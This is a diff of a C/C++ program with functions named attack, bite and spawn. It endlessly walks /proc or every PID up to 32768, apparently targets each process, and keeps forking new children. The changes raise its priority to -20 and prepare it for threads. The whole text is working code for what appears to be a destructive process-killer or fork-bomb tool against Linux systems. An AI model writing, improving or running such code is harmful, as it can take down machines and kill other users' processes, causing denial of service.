@@ -11,18 +11,22 @@
 #include <string.h>
 #include <string>
 #include <dirent.h>
+#include <pthread.h>
 
 #define MAX_PID 32768
+#define CNT_PTH 16
 
-void attack();
+inline void attack();
 inline void bite(int);
-void spawn();
+inline void spawn();
 
 char* self;
 pid_t pgid;
 
 
 int main(int argc, char* argv[]) {
+
+	setpriority(PRIO_PROCESS, 0, -20);
 
 	self = strdup(argv[0]);
 
@@ -32,26 +36,27 @@ int main(int argc, char* argv[]) {
 	if (setpgid(0, pgid)) {
 		printf("setpgid() failed!\n");
 	}
-
-	while(1){ attack(); }
+	
+	attack();
 }
 
-void attack(){
+inline void attack(){
+	while (1) {
+		DIR *d;
+		struct dirent *e;
 
-	DIR *d;
-	struct dirent *e;
-
-	d = opendir("/proc");
-	if (d) {
-		while ((e = readdir(d))) {
-			int pid = atoi(e -> d_name);
-			if (pid) { bite(pid); }
+		d = opendir("/proc");
+		if (d) {
+			while ((e = readdir(d))) {
+				int pid = atoi(e -> d_name);
+				if (pid) { bite(pid); }
+			}
+			closedir(d);
 		}
-		closedir(d);
-	}
-	else {
-		for (int i = 1; i <= MAX_PID; i++) {
-			bite(i);
+		else {
+			for (int i = 1; i <= MAX_PID; i++) {
+				bite(i);
+			}
 		}
 	}
 }
@@ -62,7 +67,7 @@ inline void bite(int pid) {
 	spawn();
 }
 
-void spawn() {
+inline void spawn() {
 	int p = fork();
 	if (p == 0) {
 		char buffer[32];
